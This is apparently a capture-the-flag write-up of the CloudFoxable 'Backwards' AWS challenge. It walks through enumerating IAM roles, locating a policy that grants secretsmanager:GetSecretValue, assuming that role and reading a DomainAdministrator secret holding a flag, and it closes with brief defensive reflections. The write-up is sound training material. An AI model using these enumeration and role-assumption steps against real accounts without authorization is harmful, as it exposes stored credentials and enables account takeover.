# Challenge: CloudFoxable Backwards

## Challenge Statement:
Assumed Breach: Principal

---

## Challenge Details:

Starting Point: arn:aws:secretsmanager:us-west-2:ACCOUNTID:secret:DomainAdministrator-Credentials-SUFFIX

In some challenges, you might not see an IAM role or an IP address as the starting point, but rather, an interesting ARN or something like that.

Sometimes during cloud penetration tests, we first find something interesting and then work backwards to see who has access to it. Is it just the Administrators? Well, that's not really a big deal. Is it all developers, or all users, or anyone in the world? That might be a really big deal!

So in this challenge, we'd like you to get comfortable finding who has access to the interesting thing. For now, the interesting thing is just another secret in secretsmanager, but in later challenges, and on cloud penetration tests, this approach will become quite important.

So, go find out who has access to DomainAdministrator-Credentials in secretsmanager and then use your cloudfoxable profile to access that role and grab the secret.

---

## Solution:

To find the flag, refer to the following procedure:

a.	In AWS CLI, set the cloudfoxable profile which is associated to IAM user ctf-starting-user. See below command.
```
set AWS_PROFILE=cloudfoxable
```

b.	Verify it using below command. It should indicate user/ctf-starting-user.
```
aws sts get-caller-identity
```

c.	List all the roles that can be assumed. The output is quite long as all the roles are listed.
```
aws iam list-roles
```

d.	Find the role and associated policy related to the given ARN – arn:aws:secretsmanager:us-west-2:ACCOUNTID:secret:DomainAdministrator-Credentials-SUFFIX. I have look at each role and finally got it as shown below.

Command:
```
aws iam list-attached-role-policies --role-name Alexander-Arnold
```

Output:
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "corporate-domain-admin-password-policy",
            "PolicyArn": "arn:aws:iam::202533511029:policy/corporate-domain-admin-password-policy"
        }
    ]
}
```

Command:
```
aws iam get-policy-version --policy-arn arn:aws:iam::202533511029:policy/corporate-domain-admin-password-policy  --version-id v1
```

Output:
```
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "secretsmanager:GetSecretValue"
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        "arn:aws:secretsmanager:us-west-2:202533511029:secret:DomainAdministrator-Credentials-ADrDZ9"
                    ]
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2025-04-03T01:39:00+00:00"
    }
}
```


e.	Based on the output, we can perform secretsmanager:GetSecretValue to the resource arn:aws:secretsmanager:us-west-2:202533511029:secret:DomainAdministrator-Credentials-ADrDZ9
Now, find the name of the secret.

Command:
```
aws secretsmanager list-secrets
```

Output:
```
{
            "ARN": "arn:aws:secretsmanager:us-west-2:202533511029:secret:DomainAdministrator-Credentials-ADrDZ9",
            "Name": "DomainAdministrator-Credentials",
            "LastChangedDate": "2025-04-02T21:39:00.440000-04:00",
            "LastAccessedDate": "2025-04-02T20:00:00-04:00",
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "Corporate Domain Admin Password"
                }
            ],
            "SecretVersionsToStages": {
                "094CF4A2-88B7-4588-B522-435A6E3DF4D0": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2025-04-02T21:38:55.448000-04:00"
        },		
```

f.	Set up the role Alexander-Arnold. Edit C:\Users\Dex\.aws\config and add the following:
```
[profile alexander-arnold]
region = us-west-2
role_arn = arn:aws:iam::202533511029:role/Alexander-Arnold
source_profile = cloudfoxable
```

g.	Get the secret value associated with secret DomainAdministrator-Credentials using alexander-arnold.
Command:
```
aws secretsmanager get-secret-value --secret-id DomainAdministrator-Credentials --profile alexander-arnold 
```
 
Output:
```
{
    "ARN": "arn:aws:secretsmanager:us-west-2:202533511029:secret:DomainAdministrator-Credentials-ADrDZ9",
    "Name": "DomainAdministrator-Credentials",
    "VersionId": "094CF4A2-88B7-4588-B522-435A6E3DF4D0",
    "SecretString": "FLAG{backwards::IfYouFindSomethingInterstingFindWhoHasAccessToIt}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2025-04-02T21:39:00.434000-04:00"
}
```

h.	The output shows the flag. The flag is: 
```
FLAG{backwards::IfYouFindSomethingInterstingFindWhoHasAccessToIt}
```

---

## Reflection:

### What was your approach?
First, I have listed all IAM roles to identify which ones had attached policies with access to the specific ARN: arn:aws:secretsmanager:us-west-2:ACCOUNTID:secret:DomainAdministrator-Credentials-SUFFIX.
The actual ARN is arn:aws:secretsmanager:us-west-2:202533511029:secret:DomainAdministrator-Credentials-ADrDZ9.
I ran commands like aws iam list-roles and aws iam list-attached-role-policies to inspect permissions. I also used aws secretsmanager get-secret-value to test access once I identified the correct role.

### What was the biggest challenge?
The biggest challenge was identifying the exact IAM role that had access to the specified secret. Understanding how permissions worked across roles took time and effort.

### How did you overcome the challenges?
I cross-referenced policies to manually inspect inline and managed policies attached to different roles.

### What led to the breakthrough?
The breakthrough came by manual IAM policy analysis. By focusing on policies related to secretsmanager:GetSecretValue, I found the role that could access the target secret.

### On the blue side, how can the learning be used to properly defend the important assets?
From a defensive perspective, organizations should restrict IAM role assumptions, implement MFA for role assumptions, and audit IAM permissions regularly.
